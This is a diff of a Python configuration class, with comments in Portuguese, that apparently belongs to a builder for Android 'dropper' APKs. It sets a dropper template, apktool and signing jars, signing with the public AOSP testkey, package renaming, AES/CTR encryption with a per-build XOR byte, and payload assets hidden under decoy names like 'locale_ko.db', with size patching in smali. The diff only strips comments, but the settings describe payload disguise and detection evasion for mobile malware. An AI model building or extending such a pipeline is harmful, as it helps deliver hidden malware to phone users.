@@ -33,7 +33,6 @@ class Config:
     PUBLIC_APP_BASE_URL = os.environ.get("PUBLIC_APP_BASE_URL", "").rstrip("/")
     PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")
 
-    # Shell Wi-Fi (R8 + Material + WorkManager + UI). Legacy em dropper_rebuild_legacy_stub/
     DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
     SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
     APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")
@@ -52,7 +51,6 @@ class Config:
     KEYSTORE_KEY_SIZE = 2048
     KEYSTORE_SIG_ALG = "SHA256withRSA"
     KEYSTORE_STORE_TYPE = "PKCS12"
-    # testkey mantido por pedido (fase atual)
     SIGNING_MODE = os.environ.get("SIGNING_MODE", "aosp_testkey")
     AOSP_TESTKEY_PK8 = os.path.join(BASE_DIR, "signing", "testkey.pk8")
     AOSP_TESTKEY_CERT = os.path.join(BASE_DIR, "signing", "testkey.x509.pem")
@@ -67,16 +65,13 @@ class Config:
     )
     APKSIGNER_V3_ENABLED = False
 
-    OLD_PACKAGE = "com.turbo.live"  # len 14 — template Wi-Fi
-    # Prefixo legado (generate_package_name agora fixa len==14 estilo com.xxxxx.yyyy)
+    OLD_PACKAGE = "com.turbo.live"
     PACKAGE_PREFIX = "com"
 
     CIPHER_TRANSFORM = "AES/CTR/NoPadding"
-    # XOR por build (vd.c0 patchado); default pool de referencia 0xE7
     CRYPTO_XOR_FIXED = False
     CRYPTO_XOR_BYTE = 0xE7
 
-    # Asset names len==12 (Wi-Fi u field) — patch dinamico de size no smali
     ASSET_NAME_POOL = (
         "locale_ko.db",
         "locale_ja.db",
